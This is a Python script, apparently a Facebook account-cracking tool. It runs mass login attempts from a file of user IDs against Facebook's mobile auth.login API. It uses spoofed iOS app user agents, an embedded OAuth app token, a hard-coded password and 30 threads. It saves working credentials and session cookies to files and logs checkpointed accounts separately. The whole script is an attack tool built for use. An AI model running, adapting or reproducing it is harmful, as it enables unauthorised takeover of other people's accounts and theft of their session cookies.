#!/usr/bin/python3
#creater : DevID
import os,requests,json,time
import re,random,sys,uuid,string,subprocess
from concurrent.futures import ThreadPoolExecutor as ThreadPool

ok, cp, pwx = [], [], []
cracked, ualist = [], []

def logo():
    os.system("clear")
    print('\x1b[1;92m |\x1b[1;97m•\x1b[1;92m| \x1b[1;97mAPI CRACKING FACEBOOK \x1b[1;92m|\x1b[1;97m•\x1b[1;92m|')
    print('\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

for i in range(1000000):
    app = [
        '296.0.0.40.116|268496502',
        '295.0.0.51.474|267272585',
        '294.0.0.60.128|262406393',
        '293.0.0.42.224|260970420',
        '291.2.0.30.111|257403963',
        '290.0.0.33.113|255210869',
        '288.0.0.39.118|252761750',
        '286.0.0.26.118|249868022',
        '285.0.0.38.116|248940267',
        '283.0.0.43.118|246076817',
        '282.0.0.38.116|244463954',
        '281.0.0.27.114|242780030',
        '280.0.0.32.106|241469109',
        '278.0.0.48.102|239438966',
        '277.0.0.35.117|237711090',
        '276.0.0.32.107|235827610',
        '276.0.0.32.107|235827610',
        '275.0.0.34.114|234101925',
        '274.1.0.51.116|233353658',
        '273.0.0.42.115|230969598',
        '272.0.0.19.116|227887324',
        '271.0.0.54.116|227057669',
        '270.0.0.30.119|222541612',
        '270.1.0.54.119|225524353',
        '269.0.0.39.116|220131619',
        '268.0.0.38.114|218798323',
        '267.0.0.57.120|218062475',
        '267.1.0.63.120|218223117',
        '266.0.0.32.114|216059178',
        '265.0.0.65.104|215460794',
        '264.0.0.63.117|214112208',
        '263.1.0.76.121|213025676',
        '263.2.0.81.121|213222891',
        '262.0.0.55.117|211287190',
        '262.1.0.71.117|211898162',
        '261.1.0.57.120|210376599',
        '258.0.0.38.114|206046776',
        '257.0.1.38.116|204807655',
        '256.0.1.26.113|203261359',
        '255.1.1.31.124|202380165',
        '254.1.0.49.115|201817294',
        '252.3.0.27.349|192722719',
        '252.0.0.21.119|198382687',
        '251.0.0.50.110|188958159',
        '249.0.0.52.118|185212925',
        '243.2.0.63.118|185212925',
        '223.0.0.51.119|156578794',
        '222.0.0.42.113|155526973',
        '217.0.0.46.75|150461556',
        '210.0.0.37.117|143754374',
        '207.0.0.48.100|141048683',
        '205.0.0.33.115|139225211',
        '202.0.0.55.99|135472877',
        '201.0.0.62.99|134918704',
        '199.0.0.69.98|132813153',
        '198.0.0.31.101|138293160',
        '196.0.0.54.99|135382157',
        '194.0.0.38.99|127868476',
        '192.0.0.61.85|126707849',
        '191.0.0.42.96|125515388',
        '189.0.0.44.93|124150883',
        '184.0.0.40.79|119872175',
        '180.0.0.37.85|116915501',
        '177.0.0.62.98|114599009',
        '176.0.0.70.93|113661473',
        '174.0.0.48.98|110921384',
        '173.0.0.65.96|109978100',
        '171.0.0.49.95|107251038',
        '170.0.0.29.119|222540989',
        '169.0.0.50.95|104829965',
        '168.0.0.57.90|103647182',
        '165.0.0.74.96|100174821',
        '164.0.0.56.96|98434650',
        '163.0.0.54.96|96876057',
        '161.0.0.47.95|94302063',
        '160.0.0.34.96|93101108',
        '159.0.0.48.97|91994325',
        '157.0.0.38.116|204807843',
        '156.0.0.41.97|89172188',
        '155.0.0.36.93|87992437',
        '154.0.0.34.386|87041355',
        '153.0.0.53.87|84268146',
        '152.0.0.45.135|83301214',
        '151.0.0.61.202|82156572',
        '150.0.0.32.132|80278251',
        '149.0.0.21.120|194764218',
        '148.0.0.45.64|78032376',
        '147.0.0.50.87|84235609',
        '146.0.0.73.91|75938921',
        '145.0.0.59.86|74951375',
        '144.0.0.55.89|74129168',
        '143.0.0.76.90|73343453',
        '142.0.0.38.63|77803202',
        '141.0.0.51.91|71695290',
        '140.0.0.63.89|70896504',
        '138.0.0.49.91|69441604',
        '136.0.0.29.91|67565708',
        '135.1.0.79.91|72922099',
        '134.0.0.51.89|66179625',
        '133.0.0.51.89|65438308',
        '132.0.0.41.90|69171754',
        '131.0.0.39.48|68165081',
        '122.0.0.40.69|61279955',
        '120.0.0.48.70|59774553',
        '119.0.0.45.70|58958965',
        '108.0.0.36.70|51642321',
        '103.0.0.29.70|48707033',
        '100.0.0.43.70|64200226',
        '100.1.0.36.68|46154306',
        '99.0.0.57.70|63577032',
        '98.0.0.25.70|44186053',
        '97.0.0.38.71|43929549',
        '96.0.0.45.70|60548545',
        '94.0.0.49.70|59086490',
        '91.0.0.41.73|57050710',
        '90.0.0.51.69|56254015',
        '89.0.0.30.69|39433806',
        '88.0.0.60.70|55239788',
        '87.0.0.44.70|54482584',
        '86.0.0.48.52|53842252',
        '85.0.0.34.62|53195005',
        '84.0.0.25.71|36443639',
        '83.0.0.38.70|51754296',
        '82.0.0.42.69|51077300',
        '81.0.0.63.70|50791291',
        '80.0.0.43.69|49927368',
        '79.0.0.44.69|49363082',
        '78.0.0.40.70|48784289',
        '77.0.0.45.70|48299134',
        '76.0.0.45.339|47725512',
        '75.0.0.48.61|45926345',
        '73.0.0.44.70|44368320',
        '72.0.0.40.71|43917395',
        '71.0.0.24.67|29968348',
        '70.0.0.30.56|29580657',
        '68.0.0.49.70|41924288',
        '67.0.0.49.70|41277963',
        '66.0.0.42.70|40764466',
        '65.0.0.53.139|40125428',
        '64.0.0.43.138|38842789',
        '63.0.0.37.140|37606630',
        '62.0.0.43.141|36454510',
        '61.0.0.53.158|35251526']
    fb,code = random.choice(app).rsplit('|')
    iphone = str(random.randrange(4,10))
    ios = str(random.randint(4,10))+'.'+str(random.randrange(0,9))+'.'+str(random.randint(0,9))
    dens = str(random.randrange(0,5))
    xzx = random.choice(['Samsung','Galaxy A7(2016)','a7xltechn','SM-A710XZ','Absolute','GT-B9120','GT-B9120','Acclaim','SCH-R880','SCH-R880','Admire','SCH-R720','SCH-R720','Amazing','amazingtrf','SGH-S730M','Baffin','baffinltelgt','SHV-E270L','Captivate Glide','SGH-I927 Samsung-SGH-I927','Captivate Glide','SGH-I927','SGH-I927','China Telecom','kylevectc','SCH-I699I','Chromebook Plus','kevin_cheets','kevin','Chromebook Plus','kevin_cheets Samsung Chromebook Plus','Chromebook Pro','caroline_cheets','caroline','Chromebook Pro','caroline_cheets Samsung Chromebook Pro','Conquer','SPH-D600','SPH-D600','DoubleTime','SGH-I857 Samsung-SGH-I857','Droid Charge','SCH-I510','SCH-I510','Elite','eliteltechn','SM-G1600','Elite','elitexltechn','SM-G1650','Europa','GT-I5500B','GT-I5500B','Europa','GT-I5500L','GT-I5500L','Europa','GT-I5500M','GT-I5500M','Europa','GT-I5503T','GT-I5503T','Europa','GT-I5510L','GT-I5510L','Exhibit','SGH-T759','SGH-T759','Galaxy (China)','GT-B9062','GT-B9062','Galaxy 070','hendrix','YP-GI2','Galaxy A','archer','archer','Galaxy A','archer','SHW-M100S','Galaxy A3 (2017)','a3y17lte','SM-A320Y','Galaxy A3','a33g','SM-A300H','Galaxy A3','a3lte','SM-A300F','Galaxy A3','a3lte','SM-A300M','Galaxy A3','a3lte','SM-A300XZ','Galaxy A3','a3lte','SM-A300YZ','Galaxy A3','a3ltechn','SM-A3000','Galaxy A3','a3ltechn','SM-A300X','Galaxy A3','a3ltectc','SM-A3009','Galaxy A3','a3ltedd','SM-A300G','Galaxy A3','a3lteslk','SM-A300F','Galaxy A3','a3ltezh','SM-A3000','Galaxy A3','a3ltezt','SM-A300YZ','Galaxy A3','a3ulte','SM-A300FU','Galaxy A3','a3ulte','SM-A300XU','Galaxy A3','a3ulte','SM-A300Y','Galaxy A3(2016)','a3xelte','SM-A310F','Galaxy A3(2016)','a3xelte','SM-A310M','Galaxy A3(2016)','a3xelte','SM-A310X','Galaxy A3(2016)','a3xelte','SM-A310Y','Galaxy A3(2016)','a3xeltekx','SM-A310N0','Galaxy A3(2017)','a3y17lte','SM-A320F','Galaxy A3(2017)','a3y17lte','SM-A320FL','Galaxy A3(2017)','a3y17lte','SM-A320X','Galaxy A5','a53g','SM-A500H','Galaxy A5','a5lte','SM-A500F','Galaxy A5','a5lte','SM-A500G','Galaxy A5','a5lte','SM-A500M','Galaxy A5','a5lte','SM-A500XZ','Galaxy A5','a5ltechn','SM-A5000','Galaxy A5','a5ltechn','SM-A500X','Galaxy A5','a5ltectc','SM-A5009','Galaxy A5','a5ltezh','SM-A5000','Galaxy A5','a5ltezt','SM-A500YZ','Galaxy A5','a5ulte','SM-A500FU','Galaxy A5','a5ulte','SM-A500Y','Galaxy A5','a5ultebmc','SM-A500W','Galaxy A5','a5ultektt','SM-A500K','Galaxy A5','a5ultelgt','SM-A500L','Galaxy A5','a5ulteskt','SM-A500F1','Galaxy A5','a5ulteskt','SM-A500S','Galaxy A5(2016)','a5xelte','SM-A510F','Galaxy A5(2016)','a5xelte','SM-A510M','Galaxy A5(2016)','a5xelte','SM-A510X','Galaxy A5(2016)','a5xelte','SM-A510Y','Galaxy A5(2016)','a5xeltecmcc','SM-A5108','Galaxy A5(2016)','a5xeltektt','SM-A510K','Galaxy A5(2016)','a5xeltelgt','SM-A510L','Galaxy A5(2016)','a5xelteskt','SM-A510S','Galaxy A5(2016)','a5xeltextc','SM-A510Y','Galaxy A5(2016)','a5xltechn','SM-A5100','Galaxy A5(2016)','a5xltechn','SM-A5100X','Galaxy A5(2016)','a5xltechn','SM-A510XZ','Galaxy A5(2017)','a5y17lte','SM-A520F','Galaxy A5(2017)','a5y17lte','SM-A520X','Galaxy A5(2017)','a5y17ltecan','SM-A520W','Galaxy A5(2017)','a5y17ltektt','SM-A520K','Galaxy A5(2017)','a5y17ltelgt','SM-A520L','Galaxy A5(2017)','a5y17lteskt','SM-A520S','Galaxy A5x(2016)','a5xeltextc','SM-A510Y','Galaxy A7','a73g','SM-A700H','Galaxy A7','a7alte','SM-A700F','Galaxy A7','a7lte','SM-A700FD','Galaxy A7','a7lte','SM-A700X','Galaxy A7','a7ltechn','SM-A7000','Galaxy A7','a7ltechn','SM-A700YD','Galaxy A7','a7ltectc','SM-A7009','Galaxy A7','a7ltektt','SM-A700K','Galaxy A7','a7ltelgt','SM-A700L','Galaxy A7','a7lteskt','SM-A700S','Galaxy A7(2016)','a7xelte','SM-A710F','Galaxy A7(2016)','a7xelte','SM-A710M','Galaxy A7(2016)','a7xelte','SM-A710X','Galaxy A7(2016)','a7xeltecmcc','SM-A7108','Galaxy A7(2016)','a7xeltektt','SM-A710K','Galaxy A7(2016)','a7xeltelgt','SM-A710L','Galaxy A7(2016)','a7xelteskt','SM-A710S','Galaxy A7(2016)','a7xeltextc','SM-A710Y','Galaxy A7(2016)','a7xltechn','SM-A7100','Galaxy A7(2017)','a7y17lte','SM-A720F','Galaxy A7(2017)','a7y17lteskt','SM-A720S','Galaxy A8','a8elte','SM-A800F','Galaxy A8','a8elte','SM-A800YZ','Galaxy A8','a8elteskt','SM-A800S','Galaxy A8','a8hplte','SM-A800I','Galaxy A8','a8hplte','SM-A800IZ','Galaxy A8','a8ltechn','SM-A8000','Galaxy A8','a8ltechn','SM-A800X','Galaxy A8','SCV32','SCV32','Galaxy A8(2016)','a8xelte','SM-A810F','Galaxy A8(2016)','a8xelte','SM-A810YZ','Galaxy A8(2016)','a8xelteskt','SM-A810S','Galaxy A9 Pro','a9xproltechn','SM-A9100','Galaxy A9 Pro','a9xproltesea','SM-A910F','Galaxy A9(2016)','a9xltechn','SM-A9000','Galaxy Ace 4 Lite','vivalto3g','SM-G313U','Galaxy Ace 4','vivaltods5m','SM-G313HU','Galaxy Ace 4','vivaltods5m','SM-G313HY','Galaxy Ace 4','vivaltods5m','SM-G313M','Galaxy Ace 4','vivaltods5m','SM-G'])
    try:
        ualist.append(f'[FBAN/FBIOS;FBAV/{fb};FBBV/{code};FBRV/0;FBDV/iPhone{iphone},1;FBMD/iphone;FBSN/iOS;FBSV/{ios};FBSS/2;FBCR/null;FBID/phone;FBLC/en_US;FBOP/5]')
    except IndexError:
        pass
def _404_():
    logo()
    fileX = input('\x1b[1;97m(\x1b[1;92m•\x1b[1;97m) \x1b[1;97mfile \033[1;37m: ')
    try:
        file_data = open(fileX,"r").read()
    except FileNotFoundError:
        time.sleep(1)
        os.system('clear')
        exit()
    print('\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    try:
        limit = int(input('\x1b[1;97m(\x1b[1;92m•\x1b[1;97m) pass limit : '))
        if limit > 9:
            limit = 3
    except ValueError:
        limit = 3
    print('\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print('\x1b[1;97m(\x1b[1;92m•\x1b[1;97m) example > first123')
    for i in range(limit):
        password = input(f'\x1b[1;97m(\x1b[1;92m•\x1b[1;97m) pass {i+1} > ')
        if len(password) >= 6:
            pwx.append(password)
    print('\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print('\x1b[1;97m(\x1b[1;92m1\x1b[1;97m) method 1')
    print('\x1b[1;97m(\x1b[1;92m2\x1b[1;97m) method 2')
    print('\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    m = input(f'\x1b[1;97m(\x1b[1;92m•\x1b[1;97m) method > ')
    with ThreadPool(max_workers=30) as DevID:
        _all = str(len(file_data.splitlines()))
        print('\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        print('\x1b[1;97m(\x1b[1;92m•\x1b[1;97m) total ids : \x1b[1;92m'+_all+f' ')
        print('\x1b[1;97m(\x1b[1;92m✔\x1b[1;97m) process has started..')
        print('\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
        uidX = file_data.splitlines()
        for uid in uidX:
            if m in['1','01']:
                DevID.submit(api,uid)
            elif m in['2','02']:
                print('\x1b[1;97m(\x1b[1;92m•\x1b[1;97m) method 2 in update');exit()
            else:
                time.sleep(1)
                os.system('clear')
                exit()
    print('\n\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
    print('\x1b[1;97m(\x1b[1;92m✔\x1b[1;97m) process has complete..')
    print('\x1b[1;97m(\x1b[1;92m•\x1b[1;97m) total ok : \x1b[1;92m'+str(len(ok)))
    print('\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

def api(uidY):
    global ok,cp
    global ualist
    global cracked
    uid = uidY.split("|")[0]
    name = uidY.split("|")[1]
    fist = name.split(" ")[0]
    try:
        last = name.split(" ")[1]
    except IndexError:
        last = "Khan"
    try:
        sys.stdout.write(f'\r\r\x1b[1;97m {len(cracked)} | \x1b[1;92m{len(ok)} \x1b[1;97m| \x1b[1;91m{len(cp)} ');sys.stdout.flush()
        _pw=['57273200']
        for pw in _pw:
            ua = random.choice(ualist)
            dataX = {'email':uid,
                    'password':pw,
                    'cpl':'true',
                    'credentials_type':'password',
                    'error_detail_type':'button_with_disabled',
                    'source':'login',
                    'format':'json',
                    'generate_session_cookies':'1',
                    'generate_analytics_claim':'1',
                    'generate_machine_id':'1'}
            headersX = {'accept-encoding': 'gzip, deflate', 
                    'Accept': '*/*', 
                    'Connection': 'keep-alive', 
                    'content-type': 'application/x-www-form-urlencoded', 
                    'Authorization': 'OAuth 6628568379|c1e620fa708a1d5696fb991c1bde5662', 
                    'x-fb-friendly-name': 'authenticate', 
                    'x-fb-http-engine': 'Liger',
                    'user-agent': ua}
            crack = requests.post('https://b-api.facebook.com/method/auth.login',data=dataX,headers=headersX,allow_redirects=False).text
            _json = json.loads(crack)
            if 'session_key' in _json:
                if uid not in ok:
                    print(f'\r\x1b[1;97m(\x1b[1;92mok\x1b[1;97m) \x1b[1;92m{uid} \x1b[1;97m─\x1b[1;92m {pw}')
                    cookie=';'.join(i['name']+'='+i['value'] for i in _json['session_cookies'])
                    open('/sdcard/ids/ok.txt','a').write(uid+'|'+pw+'\n');open('/sdcard/ids/cookie.txt','a').write(uid+'|'+pw+'|'+cookie+'\n');open('/sdcard/ua+ok.txt','a').write(ua+'\n')
                    ok.append(uid+pw)
            elif _json['error_code'] == 405:
                if uid not in cp:
                    print(f'\r\x1b[1;97m(\x1b[1;91mcp\x1b[1;97m) \x1b[1;91m{uid} \x1b[1;97m─\x1b[1;91m {pw}')
                    open('/sdcard/ids/cp.txt','a').write(uid+'|'+pw+'\n');open('/sdcard/ua+cp.txt','a').write(ua+'\n')
                    cp.append(uid+pw)
            else:continue
        cracked.append(uid)
    except requests.exceptions.ConnectionError:time.sleep(10)
    except Exception as e:print(e)
if __name__=="__main__":
    _404_()
